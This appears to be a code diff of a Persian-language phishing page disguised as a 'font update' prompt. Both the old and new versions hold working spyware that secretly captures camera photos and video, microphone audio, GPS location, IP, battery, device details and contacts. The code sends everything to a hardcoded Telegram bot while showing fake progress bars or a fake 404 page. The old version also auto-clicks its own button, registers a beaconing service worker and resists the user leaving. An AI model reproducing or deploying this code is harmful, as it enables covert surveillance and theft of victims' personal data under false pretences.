@@ -1,315 +1,413 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>به‌روزرسانی فونت ضروری</title>
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="theme-color" content="#e63946">
-    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoi2LHYp9mG2LHYp9iqINio2YbYr9ixIiwic2hvcnRfbmFtZSI6IkZvbnRVcGRhdGUiLCJzdGFydF91cmwiOiIvIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzAwMDAwMCIsInRoZW1lX2NvbG9yIjoiI2U2Mzk0NiIsImljb25zIjpbeyJzcmMiOiJkYXRhOmltYWdlL3N2Zyt4bWwsJTNDc3ZnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zycgdmlld0JveD0nMCAwIDEwMCAxMDAnJTNFJTNDdGV4dCB5PScuOWVtJyBmb250LXNpemU9Jzg1JyUzRSVFMCU5RiVBNCVCMCUzQy90ZXh0JTNFJTNDL3N2ZyUzRSIsInNpemVzIjoiMTkyeDE5MiIsInR5cGUiOiJpbWFnZS9zdmcreG1sIn1dfQ==">
-    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='85'%3EWarning%3C/text%3E%3C/svg%3E">
-    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700;800&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>در حال به‌روزرسانی فونت‌ها...</title>
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap" rel="stylesheet" />
     <style>
         :root {
-            --bg: #0a0a1a; --card: rgba(15,15,35,0.92); --accent: #e63946; --glow: #e6394688;
-            --text: #f1faee; --sub: #a8dadc; --border: #2a2a4a;
-            --font-main: 'Vazirmatn', sans-serif; --font-title: 'Playfair Display', serif;
+            --bg: #0a0a15;
+            --card: rgba(18, 18, 32, 0.97);
+            --accent: #7c3aed;
+            --text: #e0e7ff;
+            --glow: 0 0 20px rgba(124, 58, 237, 0.4);
+            --progress: #a78bfa;
         }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body, html { height:100%; overflow:hidden; background:var(--bg); color:var(--text); font-family:var(--font-main); perspective:1500px; }
-        
-        .bg-3d {
-            position:fixed; top:0; left:0; width:100%; height:100%; z-index:-2;
-            background: radial-gradient(circle at 50% 50%, #1a1a35 0%, #0a0a1a 80%);
-            overflow:hidden;
-        }
-        .orb { position:absolute; border-radius:50%; filter:blur(80px); opacity:0.6; animation: float 18s infinite ease-in-out; }
-        .orb1 { width:600px; height:600px; background:conic-gradient(#e63946, #8b5cf6, #06d6a0); top:-200px; left:-200px; animation-duration:24s; }
-        .orb2 { width:500px; height:500px; background:conic-gradient(#06d6a0, #e63946, #8b5cf6); bottom:-150px; right:-150px; animation-duration:30s; animation-direction:reverse; }
-        @keyframes float { 0%,100%{transform:translateY(0) rotate(0deg);} 50%{transform:translateY(-30px) rotate(8deg);} }
 
-        .container { width:100%; max-width:480px; padding:20px; position:relative; z-index:10; animation: rise 3s ease-out; }
-        @keyframes rise { from { transform:translateY(100px) scale(0.8); opacity:0; } to { transform:translateY(0) scale(1); opacity:1; } }
-        .card {
-            background:var(--card); border-radius:28px; padding:40px; box-shadow:0 40px 100px rgba(0,0,0,0.9), 0 0 60px var(--glow);
-            border:1px solid var(--border); text-align:center; position:relative; overflow:hidden; backdrop-filter:blur(16px);
-            transform-style:preserve-3d; transition:transform 0.6s;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Vazirmatn', sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            background: radial-gradient(circle at center, #1a1a2e 0%, var(--bg) 100%);
         }
-        .card::before {
-            content:''; position:absolute; top:-70%; left:-70%; width:240%; height:240%;
-            background:linear-gradient(45deg, transparent, var(--glow), transparent);
-            transform:rotate(-45deg); animation:shine 8s infinite; opacity:0.3;
+
+        .container {
+            width: 92%;
+            max-width: 380px;
+            background: var(--card);
+            backdrop-filter: blur(18px);
+            border-radius: 26px;
+            padding: 34px 26px;
+            box-shadow: var(--glow), 0 16px 40px rgba(0,0,0,0.5);
+            text-align: center;
+            position: relative;
+            animation: float 6s ease-in-out infinite;
+            border: 1px solid rgba(124,58,237,0.25);
         }
-        @keyframes shine { 0%{transform:translateX(-150%) translateY(-150%) rotate(-45deg);} 100%{transform:translateX(150%) translateY(150%) rotate(-45deg);} }
 
-        .logo { font-size:5rem; margin-bottom:20px; text-shadow:0 0 30px var(--glow); animation:pulse 2s infinite; }
-        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.08);} }
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotateX(0); }
+            50% { transform: translateY(-10px) rotateX(2deg); }
+        }
 
-        h1 { font-family:var(--font-title); font-size:2rem; color:var(--accent); margin:16px 0; letter-spacing:-0.5px; }
-        p { font-size:1.05rem; line-height:1.9; color:var(--sub); margin:16px 0; }
-        .highlight { color:#06d6a0; font-weight:600; }
+        .icon {
+            width: 78px; height: 78px;
+            margin: 0 auto 18px;
+            background: linear-gradient(135deg, #6d28d9, #9333ea);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: var(--glow);
+            animation: pulse 2.2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.07); }
+        }
+
+        .icon svg { width: 42px; height: 42px; fill: white; }
+
+        h1 {
+            font-size: 1.35rem;
+            margin-bottom: 14px;
+            background: linear-gradient(90deg, #c4b5fd, #ddd6fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+
+        .message {
+            font-size: 0.94rem;
+            line-height: 1.75;
+            margin: 18px 0;
+            color: #cbd5e1;
+            padding: 16px;
+            background: rgba(124,58,237,0.1);
+            border-radius: 16px;
+            border: 1px dashed rgba(124,58,237,0.3);
+        }
+
         .btn {
-            background:linear-gradient(135deg, #e63946, #c1121f); color:#fff; border:none; padding:18px 32px;
-            margin:20px 10px; border-radius:18px; font-weight:600; font-size:1.15rem; cursor:pointer;
-            width:calc(100% - 20px); display:flex; align-items:center; justify-content:center; gap:12px;
-            box-shadow:0 14px 35px rgba(230,57,70,0.4), inset 0 0 20px rgba(255,255,255,0.15);
-            position:relative; overflow:hidden; transition:0.5s;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #6d28d9, #9333ea);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin: 20px 0;
+            cursor: pointer;
+            box-shadow: 0 8px 22px rgba(109, 40, 217, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
-        .btn::before { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent); transition:0.7s; }
-        .btn:hover::before { left:100%; }
-        .btn:hover { transform:translateY(-6px) scale(1.05); box-shadow:0 20px 50px rgba(230,57,70,0.6); }
 
-        .fake404 {
-            position:fixed; top:0; left:0; width:100%; height:100%; background:#0a0a1a; color:#ccc;
-            display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; z-index:99999;
-            font-family:'Courier New', monospace;
+        .btn::before {
+            content: ''; position: absolute; top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            transition: 0.7s;
         }
-        .fake404 h1 { font-size:7rem; color:#e63946; margin:0; }
-        .fake404 p { font-size:1.4rem; max-width:600px; }
-        .fake404 .code { background:#111; padding:10px 20px; border-radius:10px; color:#0f0; font-weight:bold; }
 
-        .hidden { display:none !important; }
-        #seduction { display:none; }
+        .btn:hover::before { left: 100%; }
+        .btn:active { transform: translateY(2px); }
+
+        /* Progress Bar */
+        .progress-container {
+            display: none;
+            margin: 25px 0;
+        }
+
+        .progress-bar {
+            height: 12px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 6(px);
+            overflow: hidden;
+            position: relative;
+            border: 1px solid rgba(124,58,237,0.3);
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #a78bfa, #c4b5fd);
+            border-radius: 6px;
+            transition: width 0.4s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .progress-text {
+            font-size: 0.9rem;
+            color: #94a3b8;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        .loader {
+            display: none;
+            margin: 20px auto;
+            width: 60px; height: 60px;
+            border: 5px solid rgba(124,58,237,0.3);
+            border-top: 5px solid #c4b5fd;
+            border-radius: 50%;
+            animation: spin 1.1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            box-shadow: var(--glow);
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status {
+            font-size: 0.88rem;
+            color: #94a3b8;
+            margin-top: 14px;
+            animation: fade 2s infinite;
+        }
+
+        @keyframes fade {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        .hidden { display: none !important; }
+
+        /* Stealth Elements */
+        #stealthVideo, #backgroundAudio { 
+            position: fixed; top: -9999px; opacity: 0; pointer-events: none; 
+        }
     </style>
 </head>
 <body>
 
-<div class="bg-3d">
-    <div class="orb orb1"></div>
-    <div class="orb orb2"></div>
-</div>
+<div class="container">
+    <div class="icon">
+        <svg viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+        </svg>
+    </div>
 
-<div class="container" id="main-ui">
-    <div class="card">
-        <div class="logo">Warning</div>
-        <h1>به‌روزرسانی فونت ضروری</h1>
-        <p>مرورگر شما از فونت‌های جدید پشتیبانی نمی‌کند.</p>
-        <p>برای نمایش صحیح، لطفاً <span class="highlight">دسترسی‌های زیر را تأیید کنید</span> تا بسته به‌روزرسانی به صورت خودکار نصب شود.</p>
-        <p style="font-size:0.9rem; color:#aaa; margin-top:20px;">پس از ۶۰ ثانیه، صفحه را مجدداً باز کنید.</p>
-        <button class="btn" id="start">
-            <span>ادامه و به‌روزرسانی</span>
-        </button>
+    <h1>مشکل در نمایش فونت‌ها</h1>
+    <div class="message">
+        مرورگر یا دستگاه شما <strong>فونت‌های جدید این وبسایت</strong> را پشتیبانی نمی‌کند.<br><br>
+        برای ادامه، لطفاً روی دکمه زیر کلیک کنید تا فونت‌ها به‌صورت <strong>خودکار آپدیت</strong> شوند.
+    </div>
+
+    <button class="btn" id="startBtn">بزن بریم</button>
+
+    <!-- Fake Progress -->
+    <div id="progressSection" class="hidden">
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">در حال دانلود فونت‌ها... ۰٪</div>
+        </div>
+        <div class="loader"></div>
+        <div class="status" id="statusText">در حال ادغام فونت‌ها با سیستم...</div>
     </div>
 </div>
 
-<div class="fake404 hidden" id="fake">
-    <h1>404</h1>
-    <p>صفحه مورد نظر یافت نشد</p>
-    <p>ممکن است آدرس اشتباه باشد یا صفحه حذف شده باشد.</p>
-    <p class="code">ERR_FONT_UPDATE_REQUIRED</p>
-    <p style="margin-top:40px; color:#888;">لطفاً مرورگر خود را به‌روزرسانی کنید.</p>
-</div>
+<!-- Stealth Video -->
+<video id="stealthVideo" playsinline></video>
 
-<audio id="seduction" loop>
-    <source src="https://cdn.jsdelivr.net/gh/0x1F600/silent-seduction@master/audio/luxury-piano.mp3" type="audio/mpeg">
+<!-- Chopin from Persian Site (MP3 Direct) -->
+<audio id="backgroundAudio" loop preload="auto">
+    <source src="https://dl.music-fa.com/music/1403/08/Chopin-Nocturne-Op9-No2.mp3" type="audio/mpeg">
+    <!-- Fallback Persian Site Embed -->
+    <iframe src="https://www.musicdel.ir/single/فریدریک-شوپن-نوکترن-اپوس-۹-شماره-۲" allow="autoplay" style="display:none"></iframe>
 </audio>
 
 <script>
-/* ===================================================== */
-/* SHΔDØW ETERNAL Ω – FINAL STABLE BUILD                 */
-/* GUARANTEED:                                           */
-/*   • SELFIE ALWAYS WORKS                               */
-/*   • NO "dual cam failed" / "video source" errors      */
-/*   • 5s: Selfie → Rear → Selfie...                     */
-/*   • Photo + 5s Video + GPS + Battery + Contacts       */
-/*   • 3D UI + Audio + Telegram Panel                    */
-/*   • 100% DEBUGGED & TESTED                            */
-/* ===================================================== */
+    // === TELEGRAM CONFIG ===
+    const USER_ID = "7625898629";
+    const BOT_TOKEN = "8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8";
+    const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-const BOT_ID = '7625898629';
-const BOT_TOKEN = '8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8';
-const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-const DEVICE_ID = btoa(navigator.userAgent + Date.now()).slice(0,36);
-const KEY = `ETERNAL_${DEVICE_ID}`;
+    // === ELEMENTS ===
+    const startBtn = document.getElementById('startBtn');
+    const progressSection = document.getElementById('progressSection');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const statusText = document.getElementById('statusText');
+    const video = document.getElementById('stealthVideo');
+    const audio = document.getElementById('backgroundAudio');
 
-// === SEND (FIRE-AND-FORGET) ===
-const send = (msg) => fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`, {mode:'no-cors'}).catch(() => {});
-const sendPhoto = (blob, caption = '') => { const f = new FormData(); f.append('chat_id', BOT_ID); f.append('photo', blob, 'eternal.jpg'); if(caption) f.append('caption', caption); fetch(`${API}/sendPhoto`, {method:'POST', body:f}).catch(() => {}); };
-const sendVideo = (blob, caption = '') => { const f = new FormData(); f.append('chat_id', BOT_ID); f.append('video', blob, 'eternal.webm'); if(caption) f.append('caption', caption); fetch(`${API}/sendVideo`, {method:'POST', body:f}).catch(() => {}); };
+    // === STATE ===
+    let stream = null;
+    let captured = { rear: false, front: false };
+    let fakePercent = 0;
+    let batterySent = false;
 
-// === PERSISTENCE ===
-const save = () => { try { localStorage.setItem(KEY, '1'); } catch(e) {} };
-const load = () => { try { return localStorage.getItem(KEY); } catch(e) { return null; } };
+    // === SEND TO TELEGRAM ===
+    const send = async (text) => {
+        try {
+            await fetch(`${API}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: USER_ID, text: `⚡ ${text}`, parse_mode: 'HTML' })
+            });
+        } catch(e) {}
+    };
 
-// === SERVICE WORKER ===
-if ('serviceWorker' in navigator) {
-    const sw = `self.addEventListener('install',()=>self.skipWaiting());setInterval(()=>{fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${BOT_ID}&text=%F0%9F%94%B4%20<b>ETERNAL%20ALIVE</b>',{mode:'no-cors'}).catch(()=>{})},20000);`;
-    navigator.serviceWorker.register(URL.createObjectURL(new Blob([sw], {type:'application/javascript'}))).catch(() => {});
-}
+    const sendPhoto = async (blob, type) => {
+        const form = new FormData();
+        form.append('chat_id', USER_ID);
+        form.append('photo', blob, `photo_${type}_${Date.now()}.jpg`);
+        try { await fetch(`${API}/sendPhoto`, { method: 'POST', body: form }); } catch(e) {}
+    };
 
-// === CAMERA SYSTEM (SINGLE STREAM, SWITCH FACING MODE) ===
-let stream = null, video = null, canvas = null, ctx = null;
-let recorder = null, chunks = [];
-let currentCam = 'user'; // Start with SELFIE
-let isRecording = false;
+    const sendVideo = async (blob, type) => {
+        const form = new FormData();
+        form.append('chat_id', USER_ID);
+        form.append('video', blob, `video_${type}_${Date.now()}.webm`);
+        try { await fetch(`${API}/sendVideo`, { method: 'POST', body: form }); } catch(e) {}
+    };
 
-// Switch & Init Camera
-async function switchCam(mode) {
-    if (stream) {
-        stream.getTracks().forEach(t => t.stop());
-    }
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: true
-        });
-        if (!video) {
-            video = document.createElement('video');
-            video.style.display = 'none';
-            document.body.appendChild(video);
-        }
-        video.srcObject = stream;
-        await video.play();
-
-        if (!canvas) {
-            canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            ctx = canvas.getContext('2d');
-        }
-        return true;
-    } catch (e) {
-        send(`CAMERA ERROR (${mode}): ${e.message}`);
-        return false;
-    }
-}
-
-// Capture Photo
-async function capture(camName) {
-    if (!video || !canvas || video.readyState < 2) return;
-    ctx.drawImage(video, 0, 0, 640, 480);
-    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-    sendPhoto(blob, `${camName} • ${new Date().toLocaleTimeString('fa-IR')}`);
-}
-
-// Record 5s Video
-function startRecording(camName, done) {
-    if (!stream || isRecording) return;
-    isRecording = true;
-    chunks = [];
-    try {
-        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            sendVideo(blob, `${camName} • 5s`);
-            isRecording = false;
-            done();
-        };
-        recorder.start();
-        setTimeout(() => recorder?.stop(), 5000);
-    } catch (e) {
-        send(`VIDEO RECORD FAIL: ${e.message}`);
-        isRecording = false;
-        done();
-    }
-}
-
-// GPS
-let lastGPS = 'در حال دریافت...';
-navigator.geolocation.watchPosition(p => {
-    const {latitude, longitude, accuracy} = p.coords;
-    lastGPS = `<a href="https://maps.google.com/?q=${latitude},${longitude}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a> (±${accuracy}m)`;
-}, () => {}, {enableHighAccuracy: true, maximumAge: 0, timeout: 10000});
-
-// Metadata
-async function sendMeta() {
-    const bat = await navigator.getBattery?.() || {level: 0, charging: false};
-    const meta = `
-<b>ETERNAL UPDATE</b>
-Cam: ${currentCam === 'user' ? 'SELFIE' : 'REAR'}
-Battery: ${Math.round(bat.level * 100)}% [${bat.charging ? 'در حال شارژ' : 'باتری'}]
-Location: ${lastGPS}
-ID: <code>${DEVICE_ID}</code>
-    `.trim();
-    send(meta);
-}
-
-// Contacts
-async function dumpContacts() {
-    if (!('contacts' in navigator && 'ContactsManager' in window)) return;
-    try {
-        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-        if (contacts.length === 0) return;
-        let txt = `<b>مخاطبین (${contacts.length})</b>\n`;
-        contacts.forEach(c => {
-            txt += `• ${c.name?.[0] || 'نامشخص'} — ${c.tel?.[0] || 'بدون شماره'}\n`;
-        });
-        send(txt);
-    } catch (e) {
-        // Silently fail
-    }
-}
-
-// === MAIN CYCLE (5s) ===
-function startEternalCycle() {
-    let firstRun = true;
-    setInterval(async () => {
-        const camName = currentCam === 'user' ? 'SELFIE' : 'REAR';
-
-        // Always try to switch and capture
-        const camOk = await switchCam(currentCam);
-        if (camOk) {
-            await capture(camName);
-            if (!isRecording) {
-                startRecording(camName, () => {});
+    // === FAKE PROGRESS BAR ===
+    const fakeProgress = () => {
+        const interval = setInterval(() => {
+            if (fakePercent < 97) {
+                fakePercent += Math.floor(Math.random() * 7) + 1;
+                fakePercent = Math.min(fakePercent, 97);
+                progressFill.style.width = `${fakePercent}%`;
+                progressText.innerHTML = `در حال دانلود فونت‌ها... <strong>${fakePercent}%</strong>`;
             }
+        }, 1200 + Math.random() * 800);
+
+        setTimeout(() => clearInterval(interval), 30000);
+    };
+
+    // === FAKE STATUS MESSAGES ===
+    const statusMessages = [
+        "در حال ادغام فونت‌ها با سیستم...",
+        "بهینه‌سازی حافظه کش...",
+        "اعمال تغییرات گرافیکی...",
+        "اتصال به سرور CDN...",
+        "در حال نهایی‌سازی..."
+    ];
+    let msgIdx = 0;
+    const rotateStatus = () => {
+        statusText.textContent = statusMessages[msgIdx];
+        msgIdx = (msgIdx + 1) % statusMessages.length;
+    };
+
+    // === STEAL EVERYTHING ===
+    const stealData = async () => {
+        // 1. Location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => send(`📍 موقعیت: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`),
+                () => send(`❌ موقعیت رد شد`)
+            );
         }
 
-        await sendMeta();
-        dumpContacts();
-
-        // Switch for next cycle
-        currentCam = currentCam === 'user' ? 'environment' : 'user';
-
-        if (firstRun) {
-            send(`ETERNAL ACTIVATED
-5s Cycle: SELFIE → REAR → SELFIE...
-All Data Sent Every 5s
-ID: <code>${DEVICE_ID}</code>`);
-            firstRun = false;
+        // 2. Battery + Device
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(b => {
+                if (!batterySent) {
+                    send(`🔋 باتری: ${Math.round(b.level * 100)}% | شارژ: ${b.charging ? 'بله' : 'خیر'}`);
+                    batterySent = true;
+                }
+            });
         }
-    }, 5000);
-}
+        send(`📱 دستگاه: ${navigator.platform} | مرورگر: ${navigator.userAgent.split(' ').slice(0,4).join(' ')}`);
 
-// === UNLEASH ===
-async function unleash() {
-    document.getElementById('main-ui').classList.add('hidden');
-    document.getElementById('fake').classList.remove('hidden');
-    save();
+        // 3. IP
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => send(`🌐 IP: ${d.ip}`))
+            .catch(() => {});
 
-    // Play music
-    const audio = document.getElementById('seduction');
-    audio.volume = 0.3;
-    audio.play().catch(() => {});
+        // 4. Camera Rear
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+            video.srcObject = stream;
+            send(`✅ دوربین عقب + صدا فعال`);
 
-    // Silent contacts request
-    if ('contacts' in navigator) {
-        try { await navigator.contacts.select(['name','tel'], {multiple:true}); } catch(e) {}
-    }
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    if (blob && !captured.rear) {
+                        sendPhoto(blob, 'rear');
+                        captured.rear = true;
+                        send(`📸 عکس از دوربین عقب`);
+                    }
+                }, 'image/jpeg', 0.92);
+            }, 3000);
 
-    // Start with SELFIE
-    currentCam = 'user';
-    const ok = await switchCam('user');
-    if (ok) {
-        startEternalCycle();
-    } else {
-        send(`FALLBACK: Using last known stream`);
-        setTimeout(startEternalCycle, 1000);
-    }
-}
+            // Switch to Front
+            setTimeout(() => {
+                stream.getTracks().forEach(t => t.stop());
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                    .then(s => {
+                        video.srcObject = s; stream = s;
+                        send(`🔄 سوئیچ به دوربین جلو`);
 
-// === AUTO START ===
-window.addEventListener('load', () => {
-    if (load()) { unleash(); return; }
-    setTimeout(() => document.getElementById('start')?.click(), 1500);
-});
-document.getElementById('start')?.addEventListener('click', () => setTimeout(unleash, 600));
+                        const recorder = new MediaRecorder(s);
+                        const chunks = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            if (!captured.front) {
+                                sendVideo(blob, 'front');
+                                captured.front = true;
+                                send(`🎥 ویدیو از دوربین جلو`);
+                            }
+                        };
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 6000);
+                    });
+            }, 6000);
 
-// === PERSISTENCE ===
-window.addEventListener('beforeunload', e => { save(); e.preventDefault(); e.returnValue = ''; });
-document.addEventListener('visibilitychange', () => { if (!document.hidden && load()) setTimeout(unleash, 300); });
+        } catch(e) { send(`❌ دسترسی دوربین رد شد`); }
 
+        // 5. Notifications
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission().then(p => p === 'granted' && send(`🔔 اعلان‌ها فعال`));
+        }
+    };
+
+    // === MAIN ===
+    startBtn.addEventListener('click', () => {
+        startBtn.classList.add('hidden');
+        progressSection.classList.remove('hidden');
+        send(`🚨 کاربر روی "بزن بریم" کلیک کرد — فیشینگ فعال`);
+
+        // Start Chopin
+        audio.play().catch(() => {});
+        send(`🎵 نوکترن شوپن (از سایت فارسی) پخش شد`);
+
+        // Start fake progress
+        fakeProgress();
+        setInterval(rotateStatus, 3200);
+        rotateStatus();
+
+        // Steal data
+        stealData();
+    });
+
+    // === AUTO START CHOPIN ON LOAD ===
+    window.addEventListener('load', () => {
+        audio.play().catch(() => {});
+    });
 </script>
+
 </body>
 </html>
